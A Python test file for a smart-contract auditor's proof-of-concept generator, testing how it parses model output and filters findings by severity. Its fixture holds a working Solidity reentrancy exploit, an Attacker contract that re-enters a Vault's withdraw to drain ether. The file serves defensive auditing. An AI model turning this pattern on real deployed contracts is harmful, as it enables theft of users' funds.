from unittest.mock import MagicMock

from auditor.findings import Finding, Severity
from auditor.poc import PoCGenerator


def _f():
    return Finding(detector="reentrancy-eth", title="x",
                   severity=Severity.HIGH, confidence="Medium",
                   contract="Vault", function="withdraw",
                   file_path="contracts/Vault.sol", lines=[26],
                   description="external call before state update",
                   source="slither")


def _resp(body):
    return MagicMock(content=body, model="m", prompt_tokens=1,
                      completion_tokens=1, raw={}, latency_ms=1)


_SAMPLE_TEST = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault target;
    constructor(Vault v) { target = v; }
    receive() external payable {
        if (address(target).balance >= 1 ether) target.withdraw(1 ether);
    }
    function attack() external payable { target.deposit{value: 1 ether}(); target.withdraw(1 ether); }
}

contract ReentrancyTest is Test {
    Vault v;
    function setUp() public { v = new Vault(); vm.deal(address(v), 5 ether); }
    function test_drain() public {
        Attacker a = new Attacker(v);
        a.attack{value: 1 ether}();
        assertGt(address(a).balance, 1 ether);
    }
}
"""


def test_poc_generation_strips_fences():
    fake = MagicMock()
    fake.chat.return_value = _resp("```solidity\n" + _SAMPLE_TEST + "\n```")
    gen = PoCGenerator(client=fake)
    p = gen.generate(_f(), "contract Vault { /* ... */ }")
    assert p.error is None
    assert "contract ReentrancyTest is Test" in p.forge_test
    assert "```" not in p.forge_test


def test_poc_generation_raw_solidity():
    fake = MagicMock()
    fake.chat.return_value = _resp(_SAMPLE_TEST)
    gen = PoCGenerator(client=fake)
    p = gen.generate(_f(), "contract Vault {}")
    assert p.forge_test.startswith("// SPDX-License-Identifier")


def test_poc_generation_handles_exception():
    fake = MagicMock()
    fake.chat.side_effect = RuntimeError("boom")
    p = PoCGenerator(client=fake).generate(_f(), "")
    assert p.forge_test == ""
    assert "boom" in (p.error or "")


def test_generate_many_filters_by_severity():
    fake = MagicMock()
    fake.chat.return_value = _resp(_SAMPLE_TEST)
    gen = PoCGenerator(client=fake)
    high = _f()
    low = Finding(detector="constable-states", title="x",
                  severity=Severity.LOW, confidence="Medium",
                  contract="A", function="b",
                  file_path="x.sol", lines=[1], source="slither")
    out = gen.generate_many([high, low], "",
                             severities=[Severity.HIGH, Severity.CRITICAL])
    assert len(out) == 1
    assert out[0].fingerprint == high.fingerprint()
